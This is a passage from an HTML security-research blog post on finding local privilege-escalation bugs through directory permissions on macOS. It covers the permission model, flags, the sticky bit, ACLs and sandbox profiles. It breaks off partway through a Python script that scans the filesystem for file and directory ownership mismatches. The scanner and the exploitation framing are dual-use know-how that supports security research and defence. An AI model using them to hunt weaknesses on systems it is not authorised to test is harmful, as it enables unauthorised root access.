<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  TALK - Exploiting directory permissions on macOS · theevilbit blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Csaba Fitzl">
<meta name="description" content="This research started around summer time in 2019, when everything settled down after my talk in 2019, where I detailed how did I gained root privileges via a benign App Store application, that I developed. That exploit used a symlink to achieve this, so I though I will make a more general approach and see if this type of vulnerability exists in other places as well on macOS systems. As it turns out it does exists, and not just on macOS directly but also on other apps, it appears to be a very fruitful of issue, without too much effort I found 5 exploitable bugs on macOS, 3 in Adobe installers. In the following post I will first go over the permission model of the macOS filesystem, with focus on the POSIX part, discuss some of the non trivial cases it can produce, and also give a brief overview how it is extended. I won&rsquo;t cover every single detail of the permission model, as it would be a topic in itself, but rather what I found interesting from the exploitation perspective.
Then I will cover how to find these bugs, and finally I will go through in detail all of the bugs I found. Some of these are very interesting as we will see, as exploitation of them involves &ldquo;writing&rdquo; to files owned by root, while we are not root, which is not trivial, and can be very tricky.">
<meta name="keywords" content="">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="TALK - Exploiting directory permissions on macOS">
  <meta name="twitter:description" content="This research started around summer time in 2019, when everything settled down after my talk in 2019, where I detailed how did I gained root privileges via a benign App Store application, that I developed. That exploit used a symlink to achieve this, so I though I will make a more general approach and see if this type of vulnerability exists in other places as well on macOS systems. As it turns out it does exists, and not just on macOS directly but also on other apps, it appears to be a very fruitful of issue, without too much effort I found 5 exploitable bugs on macOS, 3 in Adobe installers. In the following post I will first go over the permission model of the macOS filesystem, with focus on the POSIX part, discuss some of the non trivial cases it can produce, and also give a brief overview how it is extended. I won’t cover every single detail of the permission model, as it would be a topic in itself, but rather what I found interesting from the exploitation perspective. Then I will cover how to find these bugs, and finally I will go through in detail all of the bugs I found. Some of these are very interesting as we will see, as exploitation of them involves “writing” to files owned by root, while we are not root, which is not trivial, and can be very tricky.">

<meta property="og:url" content="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/">
  <meta property="og:site_name" content="theevilbit blog">
  <meta property="og:title" content="TALK - Exploiting directory permissions on macOS">
  <meta property="og:description" content="This research started around summer time in 2019, when everything settled down after my talk in 2019, where I detailed how did I gained root privileges via a benign App Store application, that I developed. That exploit used a symlink to achieve this, so I though I will make a more general approach and see if this type of vulnerability exists in other places as well on macOS systems. As it turns out it does exists, and not just on macOS directly but also on other apps, it appears to be a very fruitful of issue, without too much effort I found 5 exploitable bugs on macOS, 3 in Adobe installers. In the following post I will first go over the permission model of the macOS filesystem, with focus on the POSIX part, discuss some of the non trivial cases it can produce, and also give a brief overview how it is extended. I won’t cover every single detail of the permission model, as it would be a topic in itself, but rather what I found interesting from the exploitation perspective. Then I will cover how to find these bugs, and finally I will go through in detail all of the bugs I found. Some of these are very interesting as we will see, as exploitation of them involves “writing” to files owned by root, while we are not root, which is not trivial, and can be very tricky.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-03-18T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-03-18T00:00:00+00:00">
    <meta property="article:tag" content="Macos">
    <meta property="article:tag" content="Cve">
    <meta property="article:tag" content="Lpe">
    <meta property="article:tag" content="Vulnerability">
    <meta property="article:tag" content="Conference">




<link rel="canonical" href="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/">


<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />








 




<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">

<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">









</head>




<body class="preload-transitions colorscheme-light">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/">
              TALK - Exploiting directory permissions on macOS
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2020-03-18T00:00:00Z">
                March 18, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              44-minute read
            </span>
          </div>
          
          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/macos/">Macos</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/cve/">Cve</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/lpe/">Lpe</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/vulnerability/">Vulnerability</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/conference/">Conference</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p>This research started around summer time in 2019, when everything settled down after my talk in 2019, where I detailed how did I gained root privileges via a benign App Store application, that I developed. That exploit used a symlink to achieve this, so I though I will make a more general approach and see if this type of vulnerability exists in other places as well on macOS systems. As it turns out it does exists, and not just on macOS directly but also on other apps, it appears to be a very fruitful of issue, without too much effort I found 5 exploitable bugs on macOS, 3 in Adobe installers. In the following post I will first go over the permission model of the macOS filesystem, with focus on the POSIX part, discuss some of the non trivial cases it can produce, and also give a brief overview how it is extended. I won&rsquo;t cover every single detail of the permission model, as it would be a topic in itself, but rather what I found interesting from the exploitation perspective.
Then I will cover how to find these bugs, and finally I will go through in detail all of the bugs I found. Some of these are very interesting as we will see, as exploitation of them involves &ldquo;writing&rdquo; to files owned by root, while we are not root, which is not trivial, and can be very tricky.</p>
<h2 id="the-filesystem-permission-model">
  The filesystem permission model
  <a class="heading-link" href="#the-filesystem-permission-model">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="the-posix-base-case">
  The POSIX base case
  <a class="heading-link" href="#the-posix-base-case">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Every file and directory on the system will have a permission related to the file&rsquo;s owner, the file&rsquo;s group and everyone. All of these three can have three different permissions, which are read, write, execute. In case of files these are pretty trivial, it means that a given user/group/everyone can read/write/execute the file. In case of directories it&rsquo;s a bit tricky:</p>
<ul>
<li>read - you can enumerate the directory entries</li>
<li>write - you can delete/write files to the directory</li>
<li>execute - you are allowed to traverse the directory - if you don&rsquo;t have this right, you can&rsquo;t access any files inside it, or in any subdirectories.</li>
</ul>
<h3 id="interesting-combinations">
  Interesting combinations
  <a class="heading-link" href="#interesting-combinations">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>These rules on directories create really interesting scenarios. Let&rsquo;s say you have read access to a directory but nothing else. Although it allows you to enumerate files, since you don&rsquo;t have execute rights, you still can&rsquo;t see and access the files inside, this is regardless of the file&rsquo;s permissions. If you have execute but not read access to a directory it means that you can&rsquo;t list the files, but if you know the name of the file, you can access it, assuming you have rights to it. You can try the following experiment:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mkdir restricted
</span></span><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaa &gt; restricted/aaa
</span></span><span style="display:flex;"><span>$ cat restricted/aaa
</span></span><span style="display:flex;"><span>aaa
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#f60">777</span> restricted/aaa
</span></span><span style="display:flex;"><span>$ cat restricted/aaa
</span></span><span style="display:flex;"><span>aaa
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#f60">666</span> restricted
</span></span><span style="display:flex;"><span>$ cat restricted/aaa
</span></span><span style="display:flex;"><span>cat: restricted/aaa: Permission denied
</span></span><span style="display:flex;"><span>$ ls -l restricted/
</span></span><span style="display:flex;"><span>$ ls -l | grep restricted
</span></span><span style="display:flex;"><span>drw-rw-rw-   <span style="color:#f60">3</span> csaby  staff       <span style="color:#f60">96</span> Sep  <span style="color:#f60">4</span> 14:17 restricted
</span></span><span style="display:flex;"><span>$ ls -l restricted/aaa
</span></span><span style="display:flex;"><span>ls: restricted/aaa: Permission denied
</span></span><span style="display:flex;"><span>$ ls -l restricted/
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#f60">755</span> restricted
</span></span><span style="display:flex;"><span>$ ls -l restricted/
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>-rwxrwxrwx  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">4</span> Sep  <span style="color:#f60">4</span> 14:17 aaa
</span></span></code></pre></div><p>It means that if you can&rsquo;t access a file just because of directory permissions, but can find a way to leak those files to somewhere else, you can read the contents of those files.</p>
<p>If you have <code>rwx</code> permissions on a directory you can create/modify/delete files, regardless of the owner of the files. This means that if you have such access because of you id/group membership or simply because it&rsquo;s granted to everyone, you can delete files owned by root.</p>
<h3 id="flag-modifiers">
  Flag modifiers
  <a class="heading-link" href="#flag-modifiers">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>There are many flags that a file can have, but for our case the only interesting one is the <code>uchg, uchange, uimmutable</code> flag. It means that it can&rsquo;t be changed, regardless who tries to do it. For example, a <code>root</code> can&rsquo;t delete a file if this flag is set, of course a <code>root</code> can remove the flag and then delete it. It also involves that if a file has the <code>uchg</code> flag set and it&rsquo;s owned by root, no one can change it, even if you have write access to the inclusive directory. The flag has to be removed first, which can be only done by root in this case.</p>
<p>There are is another flag, called <code>restricted</code>, which means that the particular file or directory is protected by SIP (System Integrity Protection), and thus you can&rsquo;t modify those even if you are <code>root</code>. Apple uses special internal entitlements that allows some particular processes to write to SIP protected locations.</p>
<p>To list the flags associated with a  file, run: <code>ls -lO</code>. To change flags (except <code>restricted</code>) use the <code>chflags</code> command. For example you can see a bunch of these flags in the root directory:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mac % ls -lO /
</span></span><span style="display:flex;"><span>total <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>drwxrwxr-x+ <span style="color:#f60">83</span> root  admin  sunlnk            <span style="color:#f60">2656</span> Feb <span style="color:#f60">21</span> 07:44 Applications
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">70</span> root  wheel  sunlnk            <span style="color:#f60">2240</span> Feb <span style="color:#f60">20</span> 21:44 Library
</span></span><span style="display:flex;"><span>lrwxr-xr-x   <span style="color:#f60">1</span> root  wheel  hidden              <span style="color:#f60">28</span> Feb <span style="color:#f60">21</span> 07:44 Network -&gt; /System/Volumes/Data/Network
</span></span><span style="display:flex;"><span>drwxr-xr-x@  <span style="color:#f60">8</span> root  wheel  restricted         <span style="color:#f60">256</span> Sep <span style="color:#f60">29</span> 22:23 System
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">6</span> root  admin  sunlnk             <span style="color:#f60">192</span> Sep <span style="color:#f60">29</span> 22:22 Users
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">5</span> root  wheel  hidden             <span style="color:#f60">160</span> Feb <span style="color:#f60">22</span> 13:59 Volumes
</span></span><span style="display:flex;"><span>drwxr-xr-x@ <span style="color:#f60">38</span> root  wheel  restricted,hidden <span style="color:#f60">1216</span> Jan <span style="color:#f60">28</span> 23:32 bin
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">2</span> root  wheel  hidden              <span style="color:#f60">64</span> Aug <span style="color:#f60">25</span> 00:24 cores
</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#f60">3</span> root  wheel  hidden            <span style="color:#f60">7932</span> Feb <span style="color:#f60">21</span> 07:43 dev
</span></span><span style="display:flex;"><span>lrwxr-xr-x@  <span style="color:#f60">1</span> root  admin  restricted,hidden   <span style="color:#f60">11</span> Oct <span style="color:#f60">11</span> 07:37 etc -&gt; private/etc
</span></span><span style="display:flex;"><span>lrwxr-xr-x   <span style="color:#f60">1</span> root  wheel  hidden              <span style="color:#f60">25</span> Feb <span style="color:#f60">21</span> 07:44 home -&gt; /System/Volumes/Data/home
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">3</span> root  wheel  hidden              <span style="color:#f60">96</span> Oct <span style="color:#f60">11</span> 20:38 opt
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">6</span> root  wheel  sunlnk,hidden      <span style="color:#f60">192</span> Jan <span style="color:#f60">28</span> 23:33 private
</span></span><span style="display:flex;"><span>drwxr-xr-x@ <span style="color:#f60">63</span> root  wheel  restricted,hidden <span style="color:#f60">2016</span> Jan <span style="color:#f60">28</span> 23:32 sbin
</span></span><span style="display:flex;"><span>lrwxr-xr-x@  <span style="color:#f60">1</span> root  admin  restricted,hidden   <span style="color:#f60">11</span> Oct <span style="color:#f60">11</span> 07:42 tmp -&gt; private/tmp
</span></span><span style="display:flex;"><span>drwxr-xr-x@ <span style="color:#f60">11</span> root  wheel  restricted,hidden  <span style="color:#f60">352</span> Oct <span style="color:#f60">11</span> 07:42 usr
</span></span><span style="display:flex;"><span>lrwxr-xr-x@  <span style="color:#f60">1</span> root  admin  restricted,hidden   <span style="color:#f60">11</span> Oct <span style="color:#f60">11</span> 07:42 var -&gt; private/var
</span></span></code></pre></div><h3 id="sticky-bit">
  Sticky bit
  <a class="heading-link" href="#sticky-bit">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>From exploitation perspective this is also a very important bit, especially on directories as it further limits our capabilities to mess with files.</p>
<blockquote>
<p>When a directory&rsquo;s sticky bit is set, the filesystem treats the files in such directories in a special way so only the file&rsquo;s owner, the directory&rsquo;s owner, or  <a href="https://en.wikipedia.org/wiki/Root_user"  class="external-link" target="_blank" rel="noopener">root user</a>  can rename or delete the file. Without the sticky bit set, any user with write and execute permissions for the directory can rename or delete contained files, regardless of the file&rsquo;s owner. Typically this is set on the  <a href="https://en.wikipedia.org/wiki/Temporary_directory"  class="external-link" target="_blank" rel="noopener">/tmp directory</a>  to prevent ordinary users from deleting or moving other users&rsquo; files.</p>
</blockquote>
<p>Source: <a href="https://en.wikipedia.org/wiki/Sticky_bit"  class="external-link" target="_blank" rel="noopener">Sticky bit - Wikipedia</a></p>
<h3 id="acls">
  ACLs
  <a class="heading-link" href="#acls">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Although I didn&rsquo;t find this being used extensively by default it can still affect exploitation, so it worth to mention it. The file system supports more granular access control than the POSIX model, and that is using with Access Control Lists. These lists contains Access Control Entries, which can define more specific access to a given user or group. The <code>chmod</code>&rsquo;s manpage will detail these permissions:</p>
<pre tabindex="0"><code>     The following permissions are applicable to directories:
           list    List entries.
           search  Look up files by name.
           add_file
                   Add a file.
           add_subdirectory
                   Add a subdirectory.
           delete_child
                   Delete a contained object.  See the file delete permission above.

     The following permissions are applicable to non-directory filesystem objects:
           read    Open for reading.
           write   Open for writing.
           append  Open for writing, but in a fashion that only allows writes into areas of the file not previously written.
           execute
                   Execute the file as a script or program.
</code></pre><h3 id="sandbox">
  Sandbox
  <a class="heading-link" href="#sandbox">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The Sandbox is important as it can further restrict access to specific locations. SIP is also controlled by the Sandbox, but beyond that applications can have different sandbox profiles, which will define which resources can an application access in the system, including files. So a process might run as <code>root</code>, but because of the applied sandbox profile it might not able to access specific locations. These profiles can be found in <code>/usr/share/sandbox/</code> and <code>/System/Library/Sandbox/Profiles/</code>. For example the <code>mds</code> process runs as root, however it&rsquo;s limited to write to these locations:</p>
<pre tabindex="0"><code>(...omitted...)

(allow file-write*
    (literal &#34;/dev/console&#34;)
    (regex #&#34;^/dev/nsmb&#34;)
    (literal &#34;/private/var/db/mds/system/mds.lock&#34;)
    (literal &#34;/private/var/run/mds.pid&#34;)
    (literal &#34;/private/var/run/utmpx&#34;)
    (subpath &#34;/private/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000&#34;)
    (regex #&#34;^/private/var/run/mds($|/)&#34;)
    (regex #&#34;/Saved Spotlight Indexes($|/)&#34;)
    (regex #&#34;/Backups.backupdb/\.spotlight_repair($|/)&#34;))

(allow file-write* 
    (regex #&#34;^/private/var/db/Spotlight-V100($|/)&#34;)
    (regex #&#34;^/private/var/db/Spotlight($|/)&#34;)
    (regex #&#34;^/Library/Caches/com\.apple\.Spotlight($|/)&#34;)
    (regex #&#34;/\.Spotlight-V100($|/)&#34;)
    (mount-relative-regex #&#34;^/\.Spotlight-V100($|/)&#34;)

    (mount-relative-regex #&#34;^/private/var/db/Spotlight($|/)&#34;)
    (mount-relative-regex #&#34;^/private/var/db/Spotlight-V100($|/)&#34;))

(...omitted...)

(allow file*
    (regex #&#34;^/Library/Application Support/Apple/Spotlight($|/)&#34;)
    (literal &#34;/Library/Preferences/com.apple.SpotlightServer.plist&#34;)
    (literal &#34;/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/Metadata.framework/Versions/A/Resources/com.apple.SpotlightServer.plist&#34;))
    
(...omitted...)
</code></pre><p>It&rsquo;s beyond the scope of this post to detail how to interpret the SBPL language, which is used for defining these profiles, however if you are interested, I recommend the following PDF:
<a href="https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf"  class="external-link" target="_blank" rel="noopener">https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf</a></p>
<h2 id="finding-bugs">
  Finding bugs
  <a class="heading-link" href="#finding-bugs">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Now I will detail how to find these bugs in the file system, and it will focus on two different ways doing this:</p>
<ol>
<li>Doing it trough static permission verification</li>
<li>Doing it through dynamic analysis</li>
</ol>
<h3 id="the-static-method">
  The static method
  <a class="heading-link" href="#the-static-method">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>I mainly used this case, as it&rsquo;s very simple to do, and can be easily done anytime. I differentiated 4 cases while searching, which I thought might be interesting, however really only two of those were promising, and I didn&rsquo;t dig deep into the other cases.</p>
<ol>
<li>File owner is root, but the directory owner is different</li>
<li>File owner is not root, but directory owner is root</li>
<li>File owner is root, and one of the user&rsquo;s group has write access to the directory</li>
<li>File owner is not root, but the group is wheel, and the parent folder also not root owned</li>
</ol>
<p>I made a simple python script to find these relationship, it could likely be improved, but it does the job.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span><span style="color:#555">,</span> <span style="color:#0cf;font-weight:bold">stat</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">socket</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>project_name <span style="color:#555">=</span> <span style="color:#c30">&#39;catalina_10.15.3&#39;</span>
</span></span><span style="display:flex;"><span>to_check <span style="color:#555">=</span> [<span style="color:#f60">1</span>,<span style="color:#f60">2</span>,<span style="color:#f60">3</span>,<span style="color:#f60">4</span>]
</span></span><span style="display:flex;"><span>admin_groups <span style="color:#555">=</span> [<span style="color:#f60">20</span>, <span style="color:#f60">80</span>, <span style="color:#f60">501</span>, <span style="color:#f60">12</span>, <span style="color:#f60">61</span>, <span style="color:#f60">79</span>, <span style="color:#f60">81</span>, <span style="color:#f60">98</span>, <span style="color:#f60">701</span>, <span style="color:#f60">702</span>, <span style="color:#f60">703</span>, <span style="color:#f60">33</span>, <span style="color:#f60">100</span>, <span style="color:#f60">204</span>, <span style="color:#f60">250</span>, <span style="color:#f60">395</span>, <span style="color:#f60">398</span>, <span style="color:#f60">399</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">1</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues1 <span style="color:#555">=</span> <span style="color:#366">open</span>(project_name <span style="color:#555">+</span> <span style="color:#c30">&#39;_&#39;</span> <span style="color:#555">+</span> socket<span style="color:#555">.</span>gethostname() <span style="color:#555">+</span> <span style="color:#c30">&#39;_issues1.txt&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">2</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues2 <span style="color:#555">=</span> <span style="color:#366">open</span>(project_name <span style="color:#555">+</span> <span style="color:#c30">&#39;_&#39;</span> <span style="color:#555">+</span> socket<span style="color:#555">.</span>gethostname() <span style="color:#555">+</span> <span style="color:#c30">&#39;_issues2.txt&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">3</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues3 <span style="color:#555">=</span> <span style="color:#366">open</span>(project_name <span style="color:#555">+</span> <span style="color:#c30">&#39;_&#39;</span> <span style="color:#555">+</span> socket<span style="color:#555">.</span>gethostname() <span style="color:#555">+</span> <span style="color:#c30">&#39;_issues3.txt&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">4</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues4 <span style="color:#555">=</span> <span style="color:#366">open</span>(project_name <span style="color:#555">+</span> <span style="color:#c30">&#39;_&#39;</span> <span style="color:#555">+</span> socket<span style="color:#555">.</span>gethostname() <span style="color:#555">+</span> <span style="color:#c30">&#39;_issues4.txt&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> root, dirs, files <span style="color:#000;font-weight:bold">in</span> os<span style="color:#555">.</span>walk(<span style="color:#c30">&#34;/&#34;</span>, topdown <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">True</span>):
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> f <span style="color:#000;font-weight:bold">in</span> files:
</span></span><span style="display:flex;"><span>		full_path <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(root, f)
</span></span><span style="display:flex;"><span>		directory <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>dirname(full_path)
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">1</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">if</span> (os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid <span style="color:#555">==</span> <span style="color:#f60">0</span>) <span style="color:#000;font-weight:bold">and</span> os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_uid <span style="color:#555">!=</span> <span style="color:#f60">0</span>: <span style="color:#09f;font-style:italic">#file owner is root directory is no</span>
</span></span><span style="display:flex;"><span>					<span style="color:#366">print</span>(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, directory owner is not root, it&#39;s: </span><span style="color:#a00">%s</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(os<span style="color:#555">.</span>path<span style="color:#555">.</span>dirname(full_path))<span style="color:#555">.</span>st_uid))
</span></span><span style="display:flex;"><span>					issues1<span style="color:#555">.</span>write(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, directory owner is not root, it&#39;s: </span><span style="color:#a00">%s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(os<span style="color:#555">.</span>path<span style="color:#555">.</span>dirname(full_path))<span style="color:#555">.</span>st_uid))
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">2</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">if</span> (os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#000;font-weight:bold">and</span> os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_uid <span style="color:#555">==</span> <span style="color:#f60">0</span>: <span style="color:#09f;font-style:italic">#file owner is not root directory is root</span>
</span></span><span style="display:flex;"><span>					<span style="color:#366">print</span>(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, directory owner is root, file isn&#39;t: </span><span style="color:#a00">%s</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid))
</span></span><span style="display:flex;"><span>					issues2<span style="color:#555">.</span>write(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, directory owner is root, file isn&#39;t: </span><span style="color:#a00">%s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid))
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">3</span> <span style="color:#000;font-weight:bold">in</span> to_check:
